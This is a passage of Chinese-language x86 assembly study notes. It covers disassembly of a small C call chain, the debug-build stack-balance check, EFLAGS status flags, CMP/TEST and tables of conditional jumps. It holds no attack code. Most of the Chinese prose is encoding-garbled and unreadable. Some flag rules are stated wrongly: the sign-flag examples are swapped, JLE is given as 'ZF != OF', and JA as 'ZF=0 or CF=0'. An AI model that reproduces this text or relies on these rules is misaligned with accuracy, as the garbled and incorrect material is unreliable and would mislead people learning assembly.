EBP00401061 |. 8BEC MOV EBP,ESP00401063 |. 83EC 48 SUB ESP,4800401066 |. 53 PUSH EBX00401067 |. 56 PUSH ESI00401068 |. 57 PUSH EDI00401069 |. 8D7D B8 LEA EDI,DWORD PTR SS:[EBP-48]0040106C |. B9 12000000 MOV ECX,1200401071 |. B8 CCCCCCCC MOV EAX,CCCCCCCC00401076 |. F3:AB REP STOS DWORD PTR ES:[EDI]00401078 |. C745 FC 02000&gt;MOV DWORD PTR SS:[EBP-4],20040107F |. 8B45 10 MOV EAX,DWORD PTR SS:[EBP+10]00401082 |. 50 PUSH EAX00401083 |. 8B4D 0C MOV ECX,DWORD PTR SS:[EBP+C]00401086 |. 51 PUSH ECX00401087 |. 8B55 08 MOV EDX,DWORD PTR SS:[EBP+8]0040108A |. 52 PUSH EDX0040108B |. E8 84FFFFFF CALL Stack.0040101400401090 |. 83C4 0C ADD ESP,0C00401093 |. 8945 F8 MOV DWORD PTR SS:[EBP-8],EAX00401096 |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]00401099 |. 0345 F8 ADD EAX,DWORD PTR SS:[EBP-8]0040109C |. 0345 14 ADD EAX,DWORD PTR SS:[EBP+14]0040109F |. 5F POP EDI004010A0 |. 5E POP ESI004010A1 |. 5B POP EBX004010A2 |. 83C4 48 ADD ESP,48004010A5 |. 3BEC CMP EBP,ESP004010A7 |. E8 04000000 CALL Stack.004010B0004010AC |. 8BE5 MOV ESP,EBP004010AE |. 5D POP EBP004010AF \\. C3 RETN MOV ESP,EBPä¹‹å‰è¿™ä¸‰è¡Œä»£ç æ˜¯ç¼–è¯‘å™¨åŠ çš„ï¼Œç¼–è¯‘å™¨ä¼šåœ¨debugç‰ˆè‡ªåŠ¨åŠ ä¸Šè¿™ä¸‰è¡Œï¼Œç”¨æ¥æ£€éªŒå †æ ˆæ˜¯å¦å¹³è¡¡ã€‚å› ä¸ºå®ƒè§‰å¾—ä½ åœ¨ä¸€ä¸ªcallé‡Œåˆè°ƒç”¨äº†ä¸€ä¸ªcallï¼Œå‡†å¤‡è¿”å›æ—¶å †æ ˆä¼šä¸ä¼šä¸å¹³è¡¡ã€‚ 123004010A2 |. 83C4 48 ADD ESP,48004010A5 |. 3BEC CMP EBP,ESP004010A7 |. E8 04000000 CALL Stack.004010B0 å› ä¸ºæˆ‘ä»¬æ²¡å¯¹å †æ ˆä½œå…¶ä»–æ“ä½œï¼Œå †æ ˆæ˜¯å¹³è¡¡çš„ï¼ŒESP-48åå’ŒEBPç›¸ç­‰ï¼ŒZF=1ã€‚CALL 004010B0åã€‚JNZä¸è·³è½¬ï¼Œèµ°RETNé€€å‡ºï¼›å¦‚æœä¸å¹³è¡¡ï¼Œå³ZF=0ï¼ŒJNZè·³è½¬åˆ°004010B3ï¼Œ004010B3éƒ¨åˆ†æ˜¯å‡ºé”™æç¤ºã€‚ 12345678910111213141516171819202122232425262728004010B0 /$ /75 01 JNZ SHORT Stack.004010B3004010B2 |. |C3 RETN004010B3 |&gt; \\55 PUSH EBP004010B4 |. 8BEC MOV EBP,ESP004010B6 |. 83EC 00 SUB ESP,0004010B9 |. 50 PUSH EAX004010BA |. 52 PUSH EDX004010BB |. 53 PUSH EBX004010BC |. 56 PUSH ESI004010BD |. 57 PUSH EDI004010BE |. 68 30204200 PUSH Stack.00422030 ; /Arg5 = 00422030 ASCII &quot;The value of ESP was not properly saved across a function call. This is usually a result of calling a function declared with one calling convention with a function pointer declared with a different calling convention. &quot;004010C3 |. 68 2C204200 PUSH Stack.0042202C ; |Arg4 = 0042202C004010C8 |. 6A 2A PUSH 2A ; |Arg3 = 0000002A004010CA |. 68 1C204200 PUSH Stack.0042201C ; |Arg2 = 0042201C ASCII &quot;i386\\chkesp.c&quot;004010CF |. 6A 01 PUSH 1 ; |Arg1 = 00000001004010D1 |. E8 BA020000 CALL Stack.00401390 ; \\Stack.00401390004010D6 |. 83C4 14 ADD ESP,14004010D9 |. 83F8 01 CMP EAX,1004010DC |. 75 01 JNZ SHORT Stack.004010DF004010DE |. CC INT3004010DF |&gt; 5F POP EDI004010E0 |. 5E POP ESI004010E1 |. 5B POP EBX004010E2 |. 5A POP EDX004010E3 |. 58 POP EAX004010E4 |. 8BE5 MOV ESP,EBP004010E6 |. 5D POP EBP004010E7 \\. C3 RETN 100401014 $ /E9 07000000 JMP Stack.00401020 1234567891011121314151617181900401020 /&gt; \\55 PUSH EBP00401021 |. 8BEC MOV EBP,ESP00401023 |. 83EC 40 SUB ESP,4000401026 |. 53 PUSH EBX00401027 |. 56 PUSH ESI00401028 |. 57 PUSH EDI00401029 |. 8D7D C0 LEA EDI,DWORD PTR SS:[EBP-40]0040102C |. B9 10000000 MOV ECX,1000401031 |. B8 CCCCCCCC MOV EAX,CCCCCCCC00401036 |. F3:AB REP STOS DWORD PTR ES:[EDI]00401038 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]0040103B |. 0345 0C ADD EAX,DWORD PTR SS:[EBP+C]0040103E |. 0345 10 ADD EAX,DWORD PTR SS:[EBP+10]00401041 |. 5F POP EDI00401042 |. 5E POP ESI00401043 |. 5B POP EBX00401044 |. 8BE5 MOV ESP,EBP00401046 |. 5D POP EBP00401047 \\. C3 RETN å‡½æ•°åŠŸèƒ½ï¼šä¸€ç³»åˆ—æ•´æ•°åŠ æ³•æ“ä½œ 12345678910111213141516171819202122232425int fun3(int a,int b,int c)&#123; return a+b+c;&#125;int fun2(int a,int b,int c,int d)&#123; int x=2; int y=fun3(a,b,c); return x+y+d;&#125;int fun1(int a,int b,int c,int d,int e)&#123; int x=2; int y=3; int z=fun2(a,b,c,d); return x+y+e+z;&#125;int main()&#123; int result=fun1(3,4,5,6,7); return result;&#125;"},{"title":"æ ‡å¿—å¯„å­˜å™¨å’ŒJCCæŒ‡ä»¤","path":"/wiki/Assembly_Language/æ ‡å¿—å¯„å­˜å™¨å’ŒJCCæŒ‡ä»¤.html","content":"EFLAGSå¯„å­˜å™¨ ã€Šç™½çš®ä¹¦ä¸€å·ã€‹3.4.3 EFLAGS Register P77 DF Flag The direction flag (DF, located in bit 10 of the EFLAGS register) controls string instructions (MOVS, CMPS, SCAS, LODS, and STOS). The STD and CLD instructions set and clear the DF flag, respectively 12CLD;æ–¹å‘æ ‡å¿—ä½æ¸…é›¶ï¼ˆæ­£å‘ï¼‰STD;æ–¹å‘æ ‡å¿—ä½ç½®1ï¼ˆåå‘ï¼‰ Setting the DF flag causes the string instructions to auto-decrement (to process strings from high addresses to low addresses). Clearing the DF flag causes the string instructions to auto-increment (process strings from low addresses to high addresses). æ–¹å‘æ ‡å¿—ä½çš„å€¼ å¯¹ESIå’ŒEDIçš„å½±å“ åœ°å€é¡ºåº 0 å¢åŠ  ä½åˆ°é«˜ 1 å‡å°‘ é«˜åˆ°ä½ Status Flags The status flags (bits 0, 2, 4, 6, 7, and 11) of the EFLAGS register indicate the results of arithmetic instructions, such as the ADD, SUB, MUL, and DIV instructions. The status flag functions are: CF (bit 0) Carry flag è‹¥ç®—æœ¯æ“ä½œäº§ç”Ÿçš„ç»“æœåœ¨**æœ€é«˜æœ‰æ•ˆä½(most-significant bit)**å‘ç”Ÿè¿›ä½æˆ–å€Ÿä½åˆ™å°†å…¶ç½®1ï¼Œåä¹‹æ¸…é›¶ã€‚ è¿™ä¸ªæ ‡å¿—é€šå¸¸ç”¨æ¥æŒ‡ç¤ºæ— ç¬¦å·æ•´å‹è¿ç®—çš„æº¢å‡ºçŠ¶æ€ã€‚ è¿›ä½ 12mov al,0xFEadd al,2 å€Ÿä½ 12mov al,0x7Fsub al,0xFF ä½†å…¶å®è´Ÿæ•°ä¹Ÿæ˜¯ç”¨è¡¥ç è¡¨ç¤ºï¼Œå‡æ³•å°±æ˜¯åŠ æ³•ï¼Œæ‰€ä»¥ä¸å­˜åœ¨å€Ÿä½çš„è¯´æ³• PF (bit 2) Parity flag å¦‚æœç»“æœçš„æœ€ä½æœ‰æ•ˆå­—èŠ‚(least-significant byte)åŒ…å«å¶æ•°ä¸ª1ä½åˆ™è¯¥ä½ç½®1ï¼Œå¦åˆ™æ¸…é›¶ã€‚ åœ¨å­—æ“ä½œæ—¶ï¼Œæœ€ä½æœ‰æ•ˆå­—èŠ‚å°±æ˜¯ä½8ä½ åœ¨å­—èŠ‚æ“ä½œæ—¶ï¼Œæœ€ä½æœ‰æ•ˆå­—èŠ‚å°±æ˜¯ä½4ä½ ç”¨é€”ï¼šç½‘ç»œä¼ è¾“ä¸­çš„å¥‡å¶æ ¡éªŒæ£€æŸ¥ã€‚å‡è®¾éœ€è¦ä¼ è¾“&quot;11001110&quot;ï¼Œæ•°æ®ä¸­å«5ä¸ª&quot;1&quot;ï¼Œæ‰€ä»¥å…¶å¥‡æ ¡éªŒä½ä¸º&quot;0&quot;ï¼ŒåŒæ—¶æŠŠ&quot;110011100&quot;ä¼ è¾“ç»™æ¥æ”¶æ–¹ï¼Œæ¥æ”¶æ–¹æ”¶åˆ°æ•°æ®åå†ä¸€æ¬¡è®¡ç®—å¥‡å¶æ€§ï¼Œâ€œ110011100&quot;ä¸­ä»ç„¶å«æœ‰5ä¸ª&quot;1â€ï¼Œæ‰€ä»¥æ¥æ”¶æ–¹è®¡ç®—å‡ºçš„å¥‡æ ¡éªŒä½è¿˜æ˜¯&quot;0&quot;ï¼Œä¸å‘é€æ–¹ä¸€è‡´ï¼Œè¡¨ç¤ºåœ¨æ­¤æ¬¡ä¼ è¾“è¿‡ç¨‹ä¸­æœªå‘ç”Ÿé”™è¯¯ã€‚ ä¸€ä¸ªä¾‹å­è¯æ˜æœ€ä½æœ‰æ•ˆå­—èŠ‚(least-significant byte)æŒ‡å“ªéƒ¨åˆ†ï¼š113+1 12mov ax,113add ax,1 123450000 0001 0001 0011 AX0000 0000 0000 0001 10000 0001 0001 0100 AX+1 çœ‹AX+1ï¼Œå¦‚æœæœ€ä½æœ‰æ•ˆä½æ˜¯ä»¥å­—èŠ‚æ¥çœ‹ï¼Œé‚£å°±æ˜¯0001 0100ï¼Œä¸¤ä¸ªï¼›å¦‚æœæ˜¯ä»¥å­—æ¥çœ‹ï¼Œé‚£å°±æ˜¯0000 0001 0001 0100ï¼Œ3ä¸ª1ã€‚ æ‰§è¡Œä¸Šé¢ä¸¤æ¡æŒ‡ä»¤åï¼ŒPF=1ï¼Œè¯´æ˜æœ€ä½æœ‰æ•ˆå­—èŠ‚(least-significant byte)å°±æ˜¯æŒ‡è¿™ä¸ªæ•°å­—æœ€åçš„ä¸€ä¸ªå­—èŠ‚ã€‚ AF (bit 4) Auxiliary Carry flag â€” Set if an arithmetic operation generates a carry or a borrow out of bit 3 of the result; cleared otherwise. This flag is used in binary-coded decimal (BCD) arithmetic. å¦‚æœç®—æœ¯æ“ä½œåœ¨ç»“æœçš„ç¬¬3ä½å‘ç”Ÿè¿›ä½æˆ–å€Ÿä½åˆ™å°†è¯¥æ ‡å¿—ç½®1ï¼Œå¦åˆ™æ¸…é›¶ã€‚è¿™ä¸ªæ ‡å¿—åœ¨BCD(binary-code decimal)ç®—æœ¯è¿ç®—ä¸­è¢«ä½¿ç”¨ã€‚ ä¸Šé¢æ˜¯åŸæ–‡ï¼Œç½‘ä¸Šèµ„æ–™çš„æ˜¯ï¼šè¡¨ç¤ºåŠ å‡æ³•åšåˆ°ä¸€åŠæ—¶æœ‰æ²¡æœ‰å½¢æˆè¿›ä½/å€Ÿä½ï¼Œå¦‚æœæœ‰åˆ™AF=1 åœ¨å­—æ“ä½œæ—¶ï¼Œå‘ç”Ÿä½å­—èŠ‚å‘é«˜å­—èŠ‚è¿›ä½æˆ–å€Ÿä½æ—¶ï¼› åœ¨å­—èŠ‚æ“ä½œæ—¶ï¼Œå‘ç”Ÿä½4ä½å‘é«˜4ä½è¿›ä½æˆ–å€Ÿä½æ—¶ã€‚ åŒå­—è¿›ä½ä¾‹å­ 12mov eax,0x55EEFFFFadd eax,2 å­—è¿›ä½ä¾‹å­ 12mov ax,5ffeadd ax,2 å­—èŠ‚è¿›ä½ä¾‹å­ 12mov al,4eadd al,2 ZF (bit 6) Zero flag â€” Set if the result is zero; cleared otherwise. å¸¸ä¸CMPå’ŒTESTç­‰æŒ‡ä»¤ä¸€èµ·ä½¿ç”¨ã€‚ SF (bit 7) Sign flag è¯¥æ ‡å¿—è¢«è®¾ç½®ä¸ºæœ‰ç¬¦å·æ•´å‹çš„æœ€é«˜æœ‰æ•ˆä½ã€‚(0æŒ‡ç¤ºç»“æœä¸ºæ­£ï¼Œåä¹‹åˆ™ä¸ºè´Ÿ) ä¾‹å­ 123mov al,0x7Fadd al,2;æ‰§è¡ŒåSF=0ï¼Œè´Ÿæ•° 123mov al,0xFEadd al,2;æ‰§è¡ŒåSF=1ï¼Œæ­£æ•° OF (bit 11) Overflow flag â€” Set if the integer result is too large a positive number or too small a negative number (excluding the sign-bit) to fit in the destination operand; cleared otherwise. This flag indicates an overflow condition for signed-integer (twoâ€™s complement) arithmetic. ç”¨äºåæ˜ æœ‰ç¬¦å·æ•°åŠ å‡è¿ç®—æ‰€å¾—ç»“æœæ˜¯å¦æº¢å‡ºã€‚ ä¾‹å­ 123mov al,0x7Fadd al,2;æ‰§è¡ŒåOF=1ï¼Œæº¢å‡º å¦‚æœæ˜¯æ— ç¬¦å·æ•°è¿ç®—ï¼Œæ˜¯å¦æº¢å‡ºçœ‹CFä½ï¼›å¦‚æœæ˜¯æœ‰ç¬¦å·æ•°è¿ç®—ï¼Œæ˜¯å¦æº¢å‡ºçœ‹OFä½ã€‚ æº¢å‡ºä¸»è¦æ˜¯ç»™æœ‰ç¬¦å·è¿ç®—ä½¿ç”¨çš„ï¼Œåœ¨æœ‰ç¬¦å·çš„è¿ç®—ä¸­ï¼Œæœ‰å¦‚ä¸‹çš„è§„å¾‹: æ­£ï¼‹æ­£=æ­£ï¼Œä½†å¦‚æœç»“æœæ˜¯è´Ÿæ•°ï¼Œåˆ™è¯´æ˜æœ‰æº¢å‡º è´Ÿï¼‹è´Ÿ=è´Ÿï¼Œä½†å¦‚æœç»“æœæ˜¯æ­£æ•°ï¼Œåˆ™è¯´æ˜æœ‰æº¢å‡º æ­£ï¼‹è´Ÿï¼Œæ°¸è¿œéƒ½ä¸ä¼šæœ‰æº¢å‡ºã€‚æ¯”å¦‚add al,3ï¼Œ8ä½æœ‰ç¬¦å·æ•°æ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´æ˜¯-128-127ï¼Œæç«¯æƒ…å†µï¼Œæœ€å¤§çš„æ­£æ•°+æœ€å°çš„è´Ÿæ•°ï¼Œ127+ï¼ˆ-1ï¼‰ï¼Œä¸ä¼šæº¢å‡º æµ·å“¥çš„è®²æ³•ï¼š è¿˜æ˜¯çœ‹è¿™ä¸ªåœˆï¼Œç›¸åŠ çœ‹æˆæ˜¯å¾€åæŸ¥å¤šå°‘ä¸ªæ•°ï¼Œç»•åœˆè½¬ã€‚ å¦‚æœæ˜¯æ— ç¬¦å·æ•°ï¼ŒèŒƒå›´0-FFï¼Œä¸¤æ•°è¿ç®—ï¼Œè¶…è¿‡FFå°±æ˜¯æº¢å‡º å¦‚æœæ˜¯æœ‰ç¬¦å·æ•°ï¼Œæ­£æ•°0-7Fï¼Œè´Ÿæ•°80-FFã€‚ ä¸¤æ­£æ•°ç›¸åŠ ï¼Œä½†ç›¸åŠ æ—¶èµ°è¿‡7Fèµ°åˆ°è´Ÿæ•°çš„å·¦åŠåœˆå»äº†ï¼Œå°±æ˜¯æº¢å‡ºã€‚ è´Ÿæ•°åŒç†ã€‚ æ­£+è´Ÿï¼Œå§‹ç»ˆä¸ä¼šè·‘åˆ°å¦ä¸€ä¸ªåœˆã€‚ ä¾‹å­ æ— ç¬¦å·ã€æœ‰ç¬¦å·éƒ½ä¸æº¢å‡º 12mov al,8add al,8 æ— ç¬¦å·æº¢å‡ºã€æœ‰ç¬¦å·ä¸æº¢å‡º 12mov al,0ffadd al,2 æ— ç¬¦å·ä¸æº¢å‡ºã€æœ‰ç¬¦å·æº¢å‡º 12mov al,7fadd al,2 æ— ç¬¦å·ã€æœ‰ç¬¦å·éƒ½æº¢å‡º 12mov al,0feadd al,80 è®¡ç®—æœºå¦‚ä½•åˆ¤æ–­æ˜¯å¦æœ‰æº¢å‡º æ¯”å¦‚80-40 12mov al,80sub al,40 -40ç›¸å½“äº+(-40) 12mov al,80add al,0c0 1231000 00001100 0000--------- ç¬¦å·æœ‰è¿›ä½ï¼š1 æœ€é«˜æœ‰æ•ˆæ•°å€¼ä½å‘ç¬¦å·ä½äº§ç”Ÿçš„è¿›ä½ï¼š0 1 xor 0 ==1ï¼Œæ‰€ä»¥OF=1 ä½œä¸š ç†Ÿç»ƒè®°ä½CF/PF/AF/ZF/SF/OFåœ¨EFLAGSçš„ç¬¬å‡ ä½ æ¯”è¾ƒæŒ‡ä»¤ CMP CMPï¼ˆæ¯”è¾ƒ)æŒ‡ä»¤æ‰§è¡Œä»ç›®çš„æ“ä½œæ•°ä¸­å‡å»æºæ“ä½œæ•°çš„éšå«å‡æ³•æ“ä½œï¼Œå¹¶ä¸”ä¸ä¿®æ”¹ä»»ä½•æ“ä½œæ•°ï¼š 1CMP destination,source æ ‡å¿—ä½ å½“å®é™…çš„å‡æ³•å‘ç”Ÿæ—¶,CMPæŒ‡ä»¤æŒ‰ç…§è®¡ç®—ç»“æœä¿®æ”¹æº¢å‡ºã€ç¬¦å·ã€é›¶ã€è¿›ä½ã€è¾…åŠ©è¿›ä½å’Œå¥‡å¶æ ‡å¿—ä½ã€‚ å¦‚æœæ¯”è¾ƒçš„æ˜¯ä¸¤ä¸ªæ— ç¬¦å·æ•°,åˆ™é›¶æ ‡å¿—ä½å’Œè¿›ä½æ ‡å¿—ä½è¡¨ç¤ºçš„ä¸¤ä¸ªæ“ä½œæ•°ä¹‹é—´çš„å…³ç³»å¦‚ä¸‹è¡¨æ‰€ç¤º: CMPç»“æœ ZF CF å¤‡æ³¨ ç›®çš„æ“ä½œæ•°ï¼œæºæ“ä½œæ•° 0 1 å› ä¸ºï¼œï¼Œä¸å¤Ÿå‡ï¼Œå‘ç”Ÿäº†å€Ÿä½ï¼ŒCF=1 ç›®çš„æ“ä½œæ•°ï¼æºæ“ä½œæ•° 0 0 å¤Ÿå‡ï¼Œæ²¡å€Ÿä½ï¼ŒCF=0 ç›®çš„æ“ä½œæ•°ï¼æºæ“ä½œæ•° 1 0 ä¸€æ ·å¤§ï¼Œç»“æœ=0ï¼ŒZF=1 å¦‚æœæ¯”è¾ƒçš„æ˜¯ä¸¤ä¸ªæœ‰ç¬¦å·æ•°,åˆ™ç¬¦å·æ ‡å¿—ä½ã€é›¶æ ‡å¿—ä½å’Œæº¢å‡ºæ ‡å¿—ä½è¡¨ç¤ºçš„ä¸¤ä¸ªæ“ä½œæ•°ä¹‹é—´çš„å…³ç³»å¦‚ä¸‹è¡¨æ‰€ç¤º: CMPç»“æœ æ ‡å¿—ä½ å¤‡æ³¨ ç›®çš„æ“ä½œæ•°ï¼œæºæ“ä½œæ•° SFâ‰ OF ç›®çš„æ“ä½œæ•°ï¼æºæ“ä½œæ•° SF=OF ç›®çš„æ“ä½œæ•°ï¼æºæ“ä½œæ•° ZF=1 ä¸€æ ·å¤§ï¼Œç»“æœ=0ï¼ŒZF=1 ç›®çš„æ“ä½œæ•°ï¼œæºæ“ä½œæ•°ï¼ˆä¸å¤Ÿå‡ï¼‰ ç›®çš„æ“ä½œæ•°ï¼æºæ“ä½œæ•°ï¼ˆå¤Ÿå‡ï¼‰ æ­£-æ­£&lt;=&gt;æ­£+è´Ÿ æ¯”å¦‚2-3ï¼Œç»“æœä¸ºè´Ÿï¼ŒSF=1ã€‚æ­£+è´Ÿä¸ä¼šæœ‰æº¢å‡ºï¼ŒOF=0 æ¯”å¦‚3-2ï¼Œç»“æœä¸ºæ­£ï¼ŒSF=0ã€‚æ²¡æœ‰æº¢å‡ºï¼ŒOF=0 æ­£-è´Ÿ&lt;=&gt;æ­£+æ­£ è´Ÿ-æ­£&lt;=&gt;æ­£+è´Ÿ è´Ÿ-è´Ÿ&lt;=&gt;æ­£+è´Ÿ è¿™é‡Œä¸åˆ†æäº†ï¼ŒJCCæ­»è®°ç¡¬èƒŒå°±å¥½äº† SFè¡¨ç¤ºæœ‰ç¬¦å·æ•´å‹çš„æœ€é«˜æœ‰æ•ˆä½ã€‚(0æŒ‡ç¤ºç»“æœä¸ºæ­£ï¼Œåä¹‹åˆ™ä¸ºè´Ÿ) OFç”¨äºåæ˜ æœ‰ç¬¦å·æ•°åŠ å‡è¿ç®—æ‰€å¾—ç»“æœæ˜¯å¦æº¢å‡º æ­£ï¼‹æ­£=æ­£ï¼Œä½†å¦‚æœç»“æœæ˜¯è´Ÿæ•°ï¼Œåˆ™è¯´æ˜æœ‰æº¢å‡º è´Ÿï¼‹è´Ÿ=è´Ÿï¼Œä½†å¦‚æœç»“æœæ˜¯æ­£æ•°ï¼Œåˆ™è¯´æ˜æœ‰æº¢å‡º æ­£ï¼‹è´Ÿï¼Œæ°¸è¿œéƒ½ä¸ä¼šæœ‰æº¢å‡º TEST TESTæŒ‡ä»¤åœ¨ä¸¤ä¸ªæ“ä½œæ•°çš„å¯¹åº”ä½ä¹‹é—´è¿›è¡ŒANDæ“ä½œï¼Œå¹¶æ ¹æ®è¿ç®—ç»“æœè®¾ç½®ç¬¦å·æ ‡å¿—ä½ã€é›¶æ ‡å¿—ä½å’Œå¥‡å¶æ ‡å¿—ä½ã€‚TESTæŒ‡ä»¤ä¸ANDæŒ‡ä»¤å”¯ä¸€ä¸åŒçš„åœ°æ–¹æ˜¯ï¼ŒTESTæŒ‡ä»¤ä¸ä¿®æ”¹ç›®æ ‡æ“ä½œæ•°ã€‚ TESTæŒ‡ä»¤å…è®¸çš„æ“ä½œæ•°ç»„åˆä¸ANDæŒ‡ä»¤ç›¸åŒã€‚ ç”¨é€” åœ¨å‘ç°æ“ä½œæ•°ä¸­å•ä¸ªä½æ˜¯å¦ç½®ä½ï¼ˆæ˜¯å¦æ˜¯0ï¼‰æ—¶,TESTæŒ‡ä»¤éå¸¸æœ‰ç”¨ã€‚ æ ‡å¿—ä½ TESTæŒ‡ä»¤æ€»æ˜¯æ¸…é™¤æº¢å‡ºå’Œè¿›ä½æ ‡å¿—ä½ï¼Œå…¶ä¿®æ”¹ç¬¦å·æ ‡å¿—ä½ã€é›¶æ ‡å¿—ä½å’Œå¥‡å¶æ ‡å¿—ä½çš„æ–¹æ³•ä¸ANDæŒ‡ä»¤ç›¸åŒã€‚ Jccâ€”Jump if Condition Is Met ã€Šç™½çš®ä¹¦äºŒå·ã€‹Jccâ€”Jump if Condition Is Metå°èŠ‚P660 Checks the state of one or more of the status flags in the EFLAGS register (CF, OF, PF, SF, and ZF) and, if the flags are in the specified state (condition), performs a jump to the target instruction specified by the destination operand. A condition code (cc) is associated with each instruction to indicate the condition being tested for. If the condition is not satisfied, the jump is not performed and execution continues with the instruction following the Jcc instruction. å½“æ‰§è¡ŒjccæŒ‡ä»¤æ—¶ï¼ŒjccæŒ‡ä»¤å°±æ˜¯æ ¹æ®æ ‡å¿—ä½ç›¸åº”çš„å€¼ï¼Œé€‰æ‹©è·³è½¬ï¼Œæˆ–ç»§ç»­æ‰§è¡Œã€‚è™½ç„¶é€šå¸¸ä½¿ç”¨æ¯”è¾ƒå’Œè·³è½¬çš„ç»„åˆæ¥å®ç°æ¡ä»¶ç»“æ„ï¼Œä½†åˆ«ä¹ æƒ¯äº†å®ƒä»¬å¿…é¡»æˆå¯¹å‡ºç°ï¼Œæˆ‘å¯ä»¥è¿™é‡Œæœ‰ä¸€è¡ŒCMPï¼Œç„¶åä¸­é—´ä¿®æ”¹äº†æ ‡å¿—ä½ï¼Œå¯¼è‡´æˆ‘ç”¨JZè·³è½¬æ—¶çœ‹çš„ZFä½å·²ä¸æ˜¯ç”±CMPé‚£è¡Œå†³å®šçš„ã€‚ï¼ˆå¥½åƒæœ‰ç‚¹åºŸè¯ï¼Œæ„Ÿè§‰è¿™ä¸€ç‚¹ä¸éœ€è¦è®°ç¬”è®°ï¼‰ ä¸€è§ˆè¡¨ JCCæŒ‡ä»¤ ä¸­æ–‡å«ä¹‰ è‹±æ–‡åŸæ„ æ£€æŸ¥ç¬¦å·ä½ å…¸å‹cåº”ç”¨ JZ/JE è‹¥ä¸º0åˆ™è·³è½¬ï¼›è‹¥ç›¸ç­‰åˆ™è·³è½¬ jump if zero;jump if equal ZF=1 if (i == j);if (i == 0); JNZ/JNE è‹¥ä¸ä¸º0åˆ™è·³è½¬ï¼›è‹¥ä¸ç›¸ç­‰åˆ™è·³è½¬ jump if not zero;jump if not equal ZF=0 if (i != j);if (i != 0); JS è‹¥ä¸ºè´Ÿåˆ™è·³è½¬ jump if sign SF=1 if (i &lt; 0); JNS è‹¥ä¸ºæ­£åˆ™è·³è½¬ jump if not sign SF=0 if (i &gt; 0); JP/JPE è‹¥1å‡ºç°æ¬¡æ•°ä¸ºå¶æ•°åˆ™è·³è½¬ jump if Parity (Even) PF=1 (null) JNP/JPO è‹¥1å‡ºç°æ¬¡æ•°ä¸ºå¥‡æ•°åˆ™è·³è½¬ jump if not parity (odd) PF=0 (null) JO è‹¥æº¢å‡ºåˆ™è·³è½¬ jump if overflow OF=1 (null) JNO è‹¥æ— æº¢å‡ºåˆ™è·³è½¬ jump if not overflow OF=0 (null) JC/JB/JNAE è‹¥è¿›ä½åˆ™è·³è½¬ï¼›è‹¥ä½äºåˆ™è·³è½¬ï¼›è‹¥ä¸é«˜äºç­‰äºåˆ™è·³è½¬ jump if carry;jump if below;jump if not above equal CF=1 if (i &lt; j); JNC/JNB/JAE è‹¥æ— è¿›ä½åˆ™è·³è½¬ï¼›è‹¥ä¸ä½äºåˆ™è·³è½¬ï¼›è‹¥é«˜äºç­‰äºåˆ™è·³è½¬ jump if not carry;jump if not below;jump if above equal CF=0 if (i &gt;= j); JBE/JNA è‹¥ä½äºç­‰äºåˆ™è·³è½¬ï¼›è‹¥ä¸é«˜äºåˆ™è·³è½¬ jump if below equal;jump if not above ZF=1æˆ–CF=1 if (i &lt;= j); JNBE/JA è‹¥ä¸ä½äºç­‰äºåˆ™è·³è½¬ï¼›è‹¥é«˜äºåˆ™è·³è½¬ jump if not below equal;jump if above ZF=0æˆ–CF=0 if (i &gt; j); JL/JNGE è‹¥å°äºåˆ™è·³è½¬ï¼›è‹¥ä¸å¤§äºç­‰äºåˆ™è·³è½¬ jump if less;jump if not greater equal SF != OF if (si &lt; sj); JNL/JGE è‹¥ä¸å°äºåˆ™è·³è½¬ï¼›è‹¥å¤§äºç­‰äºåˆ™è·³è½¬ jump if not less;jump if greater equal SF=OF if (si &gt;= sj); JLE/JNG è‹¥å°äºç­‰äºåˆ™è·³è½¬ï¼›è‹¥ä¸å¤§äºåˆ™è·³è½¬ jump if less equal;jump if not greater ZF != OF æˆ– ZF=1 if (si &lt;= sj); JNLE/JG è‹¥ä¸å°äºç­‰äºåˆ™è·³è½¬ï¼›è‹¥å¤§äºåˆ™è·³è½¬ jump if not less equal;jump if greater SF=OF ä¸” ZF=0 if(si&gt;sj) æ¡ä»¶è·³è½¬æŒ‡ä»¤ç±»å‹ ã€Šæ±‡ç¼–è¯­è¨€-åŸºäºx86å¤„ç†å™¨ç¬¬ä¸ƒç‰ˆã€‹P157 åŸºäºç‰¹å®šæ ‡å¿—ä½å€¼çš„è·³è½¬ åŠ©è®°ç¬¦ è¯´æ˜ æ ‡å¿—ä½/å¯„å­˜å™¨ åŠ©è®°ç¬¦ è¯´æ˜ æ ‡å¿—ä½/å¯„å­˜å™¨ JZ ä¸ºé›¶è·³è½¬ ZF=1 JNO æ— æº¢å‡ºè·³è½¬ OF=0 JNZ éé›¶è·³è½¬ ZF=0 JS æœ‰ç¬¦å·è·³è½¬ SF=1 JC è¿›ä½è·³è½¬ CF=1 JNS æ— ç¬¦å·è·³è½¬ SF=0 JNC æ— è¿›ä½è·³è½¬ CF=0 JP å¶æ ¡éªŒè·³è½¬ PF=1 JO æº¢å‡ºè·³è½¬ OF=1 JNP å¥‡æ ¡éªŒè·³è½¬ PF=0 ç›¸ç­‰æ€§çš„æ¯”è¾ƒ åŠ©è®°ç¬¦ è¯´æ˜ JE ç›¸ç­‰è·³è½¬ï¼ˆleftOp=rightOpï¼‰ JNE ä¸ç›¸ç­‰è·³è½¬ï¼ˆleftOpâ‰ rightOpï¼‰ JCXZ CX=0è·³è½¬ JECXZ ECX=0è·³è½¬ JRCXZ RCX=0è·³è½¬ï¼ˆ64ä½æ¨¡å¼ï¼‰ å°½ç®¡JEæŒ‡ä»¤ç›¸å½“äºJZ(ä¸ºé›¶è·³è½¬)ï¼ŒJNEæŒ‡ä»¤ç›¸å½“äºJNZ(éé›¶è·³è½¬)ï¼Œä½†æ˜¯ï¼Œæœ€å¥½æ˜¯é€‰æ‹©æœ€èƒ½è¡¨æ˜ç¼–ç¨‹æ„å›¾çš„åŠ©è®°ç¬¦(JEæˆ–JZ),ä»¥ä¾¿è¯´æ˜æ˜¯æ¯”è¾ƒä¸¤ä¸ªæ“ä½œæ•°è¿˜æ˜¯æ£€æŸ¥ç‰¹å®šçš„çŠ¶æ€æ ‡å¿—ä½ã€‚ æ— ç¬¦å·æ•°æ¯”è¾ƒ åŠ©è®°ç¬¦ è¯´æ˜ åŠ©è®°ç¬¦ è¯´æ˜ JA å¤§äºè·³è½¬ï¼ˆè‹¥leftOpï¼rightOpï¼‰ JB å°äºè·³è½¬ï¼ˆè‹¥leftOpï¼œrightOpï¼‰ JNBE ä¸å°äºæˆ–ç­‰äºè·³è½¬ï¼ˆä¸JAç›¸åŒï¼‰ 